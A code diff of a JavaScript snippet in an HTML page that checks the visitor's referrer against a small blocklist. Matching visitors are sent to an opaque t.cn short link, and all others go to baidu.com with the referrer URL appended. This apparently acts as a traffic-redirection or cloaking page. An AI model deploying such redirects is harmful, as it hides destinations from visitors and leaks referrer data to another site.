@@ -5,20 +5,21 @@
 var website = "http://www.baidu.com";
 var blacks = ["5sm.com","zjl"];
 var jsurl=document.referrer;
+var isBlack=false;
 for(key in blacks){
 if(jsurl.indexOf(blacks[key]) >= 0){
-jsurl="";
-this.location.href = "http://t.cn/Aie5aPOX";
+isBlack=true;
 break;}}
 q = jsurl.split("?");
 if(q[1] == undefined || q[1] == "" || q[1] == null)
 q[1] = "";
 else 
 q[1] = "?" + q[1];
-if(jsurl!=""){
-	alert(1);
-jsurl = "?" + jsurl;
-this.location.href = website + jsurl;}
+if(isBlack){
+	this.location.href = "http://t.cn/Aie5aPOX";
+}else{
+	this.location.href = website + "?" + jsurl;
+}
 </script>
 <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
 <title></title>
